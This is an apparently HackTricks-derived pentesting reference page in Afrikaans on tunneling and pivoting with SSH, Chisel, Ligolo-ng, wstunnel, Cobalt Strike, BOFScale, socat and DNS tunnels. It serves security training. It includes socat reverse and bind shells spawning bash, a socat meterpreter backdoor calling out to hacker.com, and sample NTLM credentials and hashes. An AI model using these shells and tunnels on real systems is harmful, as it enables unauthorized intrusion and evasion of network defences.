# Tunneling en Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-wenk

> [!WARNING]
> Nmap se proxy-ondersteuning is beperk tot TCP-verbindings en beïnvloed nie ping-, poort- of OS-detection-skanderings nie. Wanneer die scanner agter ’n SOCKS-proxy is, **deaktiveer host discovery** (`-Pn`) en gebruik ’n **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Die finale opdrag gebruik Evil-WinRM se `-u`- en `-i`-opsies om die rekening en WinRM-host te identifiseer; sy verstek-WinRM-poort is 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH kan X11-verbindings, arbitrêre TCP-poorte en Unix-domeinsokkeurings oor sy geënkripteerde kanaal aanstuur.<sup>[[6]](#references)</sup>

SSH-grafiese verbinding (X)

`-Y` aktiveer vertroude X11-aansturing en `-C` versoek kompressie vir aangestuurde data.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Open nuwe Port in SSH Server --> Ander port

Remote (`-R`) forwarding luister op die SSH-server en verbind met die plaaslike kant; die eksplisiete bind-adres beheer watter koppelvlakke toegang tot daardie luisteraar kan verkry.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Plaaslike poort --> Gekompromitteerde host (SSH) --> Third_box:Port

Plaaslike (`-L`) forwarding luister op die kliënt en verbind vanaf die SSH-bedienerkant met die bestemming.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Plaaslike poort --> Gekompromitteerde host (SSH) --> Enige plek

Dynamic (`-D`) forwarding skep ’n plaaslike SOCKS4/SOCKS5-listener waarvan die verbindings vanaf die remote kant geopen word.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Multi-hop met ProxyJump

`-J`/`ProxyJump` verbind met die teiken deur een of meer kommageskeide jump hosts. Forwarding-opsies behoort steeds aan die finale SSH-verbinding, dus maak die SOCKS-listener hieronder verbindings na bestemmings vanaf `internal-target`, nie vanaf die eerste bastion nie. Dit vermy dat jy by ’n jump host aanmeld en daar ’n tweede SSH-client begin.<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
Host-spesifieke opsies vir jump machines moet in `~/.ssh/config` geplaas word; konfigurasie op die command line wat vir die bestemming bedoel is, word nie outomaties op intermediêre hosts toegepas nie.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Dit is nuttig om reverse shells vanaf interne hosts deur ’n DMZ na jou host te kry:

Die bediener se `GatewayPorts`-instelling beheer of ’n remote forward buite loopback kan bind; die verstekwaarde daarvan is `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Hierdie root-gebaseerde voorbeeld skep tunnel-toestelle op albei hosts. Die server moet tun forwarding toelaat, en die geselekteerde rekening moet toegang tot die tun-toestel hê; `PermitRootLogin yes` is een manier om die `root`-rekening hier te gebruik.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Aktiveer forwarding aan die bedienerkant
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Stel ’n nuwe roete aan die kliëntkant in
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sekuriteit – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 het 'n strict-KEX-uitbreiding bygevoeg om Terrapin se aanval op die integriteit van die vroeë transportlaag teë te werk. Dateer albei eweknieë op waar moontlik en volg die verskaffer se riglyne vir ouer implementerings, eerder as om aan te neem dat 'n aangestuurde kanaal slegs op grond van die weergawe beskerm word.<sup>[[8]](#references)</sup>

## SSHUTTLE

Jy kan alle **traffic** via **ssh** deur 'n host na 'n **subnetwork** **tunnel**.\
Byvoorbeeld, om alle **traffic** wat na 10.10.10.0/24 gaan, aan te stuur.

`sshuttle` verskaf deursigtige proxying oor SSH en ondersteun die selektering van subnetwerke en 'n pasgemaakte SSH-opdrag, soos hieronder getoon.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Koppel met ’n private sleutel
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit se `portfwd` ondersteun plaaslike en remote forwarding, terwyl sy SOCKS proxy module bedoel is om met session routes of `autoroute` te werk en by verstek op port 1080 luister in hierdie voorbeelde.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Plaaslike port --> Gekompromitteerde host (aktiewe session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Nog 'n manier:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike se Beacon kan SOCKS4a/SOCKS5-verbindings deur ’n Beacon herlei; `rportfwd` bind aan die gekompromitteerde gasheer, terwyl `rportfwd_local` die bestemmingsverbinding vanaf die Cobalt Strike-kliënt begin.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Maak ’n poort in die Team Server oop op die interfaces wat verkeer deur die Beacon moet roeteer.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In hierdie geval word die **poort op die Beacon-gasheer oopgemaak**, nie op die Team Server nie, en die verkeer word na die Team Server gestuur en van daar af na die aangeduide gasheer:poort.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Die reverse-forwarding-handleiding dui die volgende gedrag aan:<sup>[[14]](#references)</sup>

- Beacon se reverse port forward is ontwerp om **verkeer na die Team Server te tonnel, nie om tussen individuele masjiene te relay nie**.
- Verkeer word **binne Beacon se C2-verkeer getonnel**, insluitend P2P-skakels.
- Hoë poorte vermy gewoonlik beperkings op bevoorregte poorte, maar die teiken-OS se beleid en bestaande listeners geld steeds.

### rPort2Port local

> [!WARNING]
> In hierdie geval word die **port op die Beacon-host oopgemaak**, nie op die Team Server nie, en die **verkeer word na die Cobalt Strike-kliënt gestuur** (nie na die Team Server nie) en van daar af na die aangeduide host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - CDN-voorgelêde in-proses-tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) laat 'n aangepaste Tailscale-overlay binne 'n Windows C2-implantaat loop sonder om 'n TUN-driver of diens te installeer. Die drie komponente daarvan is 'n asinchroniese CGo `c-shared` `tailscaled` BOF-PE, 'n klein C++ BOF-PE wat met die plaaslike API kommunikeer, en 'n asinchroniese `socksportfwd` TCP-na-SOCKS5-brug.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-versoenbare TS2021 en DERP

Tailscale gebruik normaalweg eie HTTP-opgraderings vir die Noise-gebaseerde TS2021-beheerkanaal en DERP-relay. BOFScale behou daardie greepdatastrome, maar dra dit in RFC 6455-WebSockets, met gebruik van `Sec-WebSocket-Protocol: ts2021` of `derp`, sodat 'n operateur-beheerde Headscale/DERP-origin agter 'n CDN kan sit wat slegs standaard WebSocket-opgraderings aanvaar. Die gelapte kliënt probeer TS2021 weer oor WebSockets ná HTTP `500`, probeer DERP weer ná HTTP `426`, en laat die DERP WebSocket-dialer die gasheer se proxy-konfigurasie respekteer; die BOF stel `TS_DEBUG_DERP_WS_CLIENT=1` in om die bekende-mislukkende eerste poging oor te slaan.<sup>[[53]](#references)[[54]](#references)</sup>

Die CDN en origin-proxy moet WebSocket-opgraderings vir `/ts2021` en `/derp` behou, `/key` as gewone HTTP aanstuur, en interne lees-/skryf-timeouts deaktiveer omdat relay-sessies onbepaald oop kan bly. Die verskafte Headscale-konfigurasie aktiveer `verify_clients`, publiseer slegs die operateur se ingebedde DERP-map, en laat `derp.urls` leeg om terugval na Tailscale-beheerde relays te voorkom.<sup>[[53]](#references)[[54]](#references)</sup>

### In-proses-daemon en benoemde-pyp-beheer

Tensy dit oorskryf word, begin die BOF-ingangspunt `tailscaled` met `-tun=userspace-networking`, `-state mem:`, en `-no-logs-no-support`, en skep daarna 'n UUID-benoemde pyp. Dit herlei Go stdout/stderr deur 'n OS-pyp na die Beacon-uitset-API, sodat die volledige daemon en Go-runtime resident bly, maar toestand en logs nie na 'n Tailscale-gids geskryf word nie.<sup>[[53]](#references)[[54]](#references)</sup>

Die liggewigkliënt reproduseer Tailscale se plaaslike HTTP/1.0-API oor daardie pyp. Dit maak die pyp oop met `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` omdat die daemon se `safesocket`-laag die pypkliënt naboots, stuur `Tailscale-Cap: 125`, en karteer die plaaslike API na `up`-, `down`-, `status`-, roete-advertensie- en afsluitbewerkings.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Moenie 'n handmatig gemapte Go BOF-PE ontlaai nadat die daemon opdrag gegee is om af te sluit nie: runtime- en garbage-collector-goroutines kan voortgaan om uit geheue uit te voer wat deur die loader ontkarteer word. Laat `tailscaled` in 'n afsonderlike proses loop en beëindig daardie proses vir finale opruiming.<sup>[[54]](#references)</sup>

### Lei gasheer-geïnisieerde verkeer deur gebruikersruimte-SOCKS5

Inkomende tailnet-verbindings en geadverteerde subnet-roetes werk binne die gebruikersruimte-netwerkstapel, maar gewone prosesse op die gekompromitteerde gasheer het geen OS-roete na die overlay nie. `socksportfwd` luister dus op 'n slagoffergerigte TCP-poort, onderhandel SOCKS5 `NO AUTH` met die daemon se `0.0.0.0:1080`-luisteraar, stuur `CONNECT` vir 'n tailnet-bestemming, en relê albei rigtings asinchronies. Wanneer die teiken 'n MagicDNS-naam is, gebruik dit `ATYP_DOMAIN`, sodat `tailscaled` die naam oplos sonder om dit aan die Windows-resolver bloot te stel.<sup>[[53]](#references)[[54]](#references)</sup>

'n Minimale operateurvloei word hieronder getoon; beide die operateur-node en implantaat moet die gelapte binaries gebruik omdat standaard-Tailscale nie hierdie CDN-ontwerp kan deurkruis nie.<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
Die local forward kan die oënskynlike authentication listener van die relay tool skei: dwing ’n masjien om te authenticateer teen die compromised host se gebonde poort, forward dit deur die tailnet na `ntlmrelayx`, en relay dit verder na AD CS, LDAP, HTTP, SMB, of ’n ander compatible target. Sien [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) en [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) vir die vulnerability-spesifieke fases; BOFScale is slegs die transport.<sup>[[54]](#references)</sup>

### Opsporing

Soek na die kombinasie eerder as ’n enkele swak indikator: ’n Go runtime in ’n proses wat normaalweg nie Go-gebaseerd is nie, ’n UUID pipe met permissiewe SDDL `D:(A;;GA;;;WD)`, ’n onverwagte `0.0.0.0:1080` SOCKS listener, en langdurige TLS WebSockets na CDN-adresse. Met TLS-inspeksie, flag `Sec-WebSocket-Protocol: derp` of `ts2021` wanneer die eienaar-proses nie ’n gemagtigde `tailscaled` service is nie. Die repository se `bofscale.yar`-reëls verskaf memory signatures vir al drie BOF-PE-komponente.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Die projek verskaf web tunnel endpoints soos `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, en `tunnel.php`; upload een ondersteunde endpoint voordat jy die local proxy begin.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Jy kan dit aflaai vanaf die releases-bladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel dra TCP/UDP-verkeer oor HTTP met behulp van ’n SSH-beskermde verbinding; gebruik versoenbare client/server builds en verifieer die geselekteerde release se command syntax.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) vervoer statiese of dinamiese forwards oor WebSocket, HTTP/2 of WebTransport (HTTP/3 oor QUIC). Huidige builds ondersteun TCP, UDP, Unix-sockets, stdio, SOCKS5, HTTP-proxying en Linux-transparent-proxy-listeners in beide forward- en reverse-modusse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Begin die server op die attacker en laat die pivot met `-R` outbound verbind. In hierdie rigting word die SOCKS5-listener op die **server** geskep, terwyl versoekte verbindings vanaf die **client/pivot**-netwerk ontstaan.<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
'n Reverse static forward gebruik dieselfde rigting. Byvoorbeeld, die volgende stel `10.10.10.20:445`, soos deur die pivot bereik, op die aanvaller se loopback-poort `8445` beskikbaar:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Egress- en transportbesonderhede

- Voeg `-p http://user:pass@proxy:8080` by die client om deur ’n eksplisiete HTTP-proxy te gaan. Gebruik `socks5h://127.0.0.1:1080` in clients soos `curl` (of aktiveer proxied DNS in die toepassing) sodat interne name anderkant die tunnel opgelos word eerder as om na die plaaslike resolver uit te lek.<sup>[[52]](#references)</sup>
- `wss://` kies TLS-beskermde WebSocket. ’n `https://`-client kies HTTP/2, maar buffering of HTTP/1-omskakeling deur reverse proxies/CDNs breek die bidirectionele stroom dikwels; stel die wstunnel-server direk bloot wanneer hierdie modus getoets word.<sup>[[52]](#references)</sup>
- `wts://` kies WebTransport oor QUIC. Begin die server met `--enable-webtransport` (of ’n `wts://`-listen-URL) en laat UDP op die luisterpoort toe. Hierdie modus kan nie deur ’n konvensionele HTTP `CONNECT`-proxy gaan nie omdat daardie proxy TCP dra.<sup>[[52]](#references)</sup>

> [!WARNING]
> Die upstream-projek waarsku dat sy ingebedde self-ondertekende sertifikaat nie as privaatheidsbeskerming behandel moet word nie. Verkies ’n geldige custom certificate plus `--tls-verify-certificate` (of mTLS), hou proxy listeners op loopback tensy afstandtoegang opsetlik is, en tunnel reeds-veilige protokolle wanneer confidentiality belangrik is.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Die Ligolo-ng quickstart dokumenteer ’n TUN-interface op die proxy, certificate-fingerprint validation vir die agent, en route-opstelling vir die getunnelde netwerk.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding en Listening

Ligolo-ng kan listeners op die agent byvoeg wat na ’n proxy-side-adres forward, en sy gereserveerde `240.0.0.0/4`-reeks kan gerouteer word om agent-local services te bereik.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Toegang tot Agent se plaaslike poorte
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot begin die reverse tunnel vanaf die slagoffer en stel ’n SOCKS4-proxy op die aanvaller se loopback-adres beskikbaar; sy README dokumenteer ook NTLM-proxy credentials en hash options.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot via **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombineer adresstipes soos `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` en `PROXY`; die voorbeelde hieronder kombineer daardie gedokumenteerde eindpunte.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port deur socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter deur SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Jy kan deur 'n **nie-geauthentiseerde proxy** beweeg met socat se gedokumenteerde `PROXY`-adres tipe deur hierdie reël in plaas van die laaste een in die slagoffer se konsole uit te voer.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Skep sertifikate aan beide kante: Kliënt en Bediener
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Koppel die plaaslike SSH-poort (22) aan die aanvaller se 443-poort
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink is PuTTY se command-line connection tool, met SSH-forwardingopsies soortgelyk aan `ssh`.<sup>[[22]](#references)</sup>

Gebruik hoofletter `-P` vir die SSH-poort. `-pw` word vir versoenbaarheid behou, maar stel die wagwoord in die process list bloot; verkies key authentication of `-pwfile` waar moontlik.<sup>[[22]](#references)[[23]](#references)</sup>

Aangesien hierdie binary op die slagoffer uitgevoer sal word en dit ’n SSH-client is, maak die SSH-diens en -poort oop vir die reverse connection; die volgende gebruik `-R` om ’n plaaslik toeganklike poort na die aanvaller se masjien te forward.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Gebruik ’n konteks met die toestemmings wat deur die host vereis word wanneer jy aanhoudende `portproxy`-reëls skep of verander. Microsoft dokumenteer die `v4tov4`-vorms vir byvoeging, vertoon en verwydering wat hieronder gebruik word.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Jy moet **RDP-toegang tot die stelsel** hê.\
Laai af:

SocksOverRDP gebruik Remote Desktop Dynamic Virtual Channels om 'n SOCKS5-verbinding oor 'n bestaande RDP-sessie te dra; die client plugin luister op `127.0.0.1:1080`, terwyl die server component op die RDP-teiken loop.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie tool gebruik `Dynamic Virtual Channels` (`DVC`) van die Remote Desktop Service-funksie van Windows. DVC is verantwoordelik daarvoor om **pakkette oor die RDP-verbinding te tonnel**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** soos volg op jou client-rekenaar:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nou kan ons via **RDP** met die **slagoffer** **verbind** deur **`mstsc.exe`** te gebruik, en ons behoort ’n **prompt** te ontvang wat aandui dat die **SocksOverRDP-plugin** geaktiveer is, en dat dit op **127.0.0.1:1080** sal **luister**.

**Verbind** via **RDP** en laai die `SocksOverRDP-Server.exe`-binary op die slagoffermasjien op en voer dit uit:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bevestig nou op jou masjien (aanvaller) dat poort 1080 luister:
```
netstat -antb | findstr 1080
```
Nou kan jy [**Proxifier**](https://www.proxifier.com/) gebruik om die verkeer deur daardie poort via 'n proxy te stuur.<sup>[[26]](#references)</sup>

## Proxify Windows GUI-toepassings

Jy kan Windows GUI-toepassings deur 'n proxy laat verbind met [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Gaan na **Profile -> Proxy Servers** en voeg die IP en poort van die SOCKS-bediener by.\
Gaan na **Profile -> Proxification Rules** en voeg die naam van die program wat jy wil proxify, sowel as die verbindings na die IP's wat jy wil proxify, by; Proxifier-reëls kan toepassings, teiken-gashere en poorte pas.<sup>[[27]](#references)</sup>

## Tonnel deur 'n NTLM-proxy

Die voorheen genoemde hulpmiddel, **Rpivot**, kan deur 'n NTLM-verifiërende proxy relay. **OpenVPN** kan ook deur een roeteer wanneer dit met 'n auth-lêer en die NTLMv2-metode gekonfigureer is; dit is proxy traversal, nie 'n bypass van proxy-verifikasie nie.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm authenticates to upstream NTLM proxies, exposes local listeners, and can map a local tunnel port to a destination service; clients can then use that local port.<sup>[[29]](#references)</sup>\
Byvoorbeeld, daardie forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nou, as jy byvoorbeeld die **SSH**-diens op die victim instel om op poort 443 te luister, kan jy daardeur via die attacker-poort 2222 koppel.<sup>[[29]](#references)</sup>\
Jy kan ook ’n **meterpreter** gebruik wat aan localhost:443 koppel terwyl die attacker op poort 2222 luister.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) is Microsoft se .NET reverse-proxy toolkit. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine skep ’n IPv4-tunnel deur DNS-navrae en gebruik TUN-interfaces; die gedokumenteerde opstelling vereis die voorregte wat nodig is om daardie interfaces aan beide kante te skep.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS-transport het groter oorhoofse koste as direkte TCP en is gewoonlik stadig; jy kan ’n gekomprimeerde SSH-verbinding deur hierdie tonnel skep deur die volgende te gebruik:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

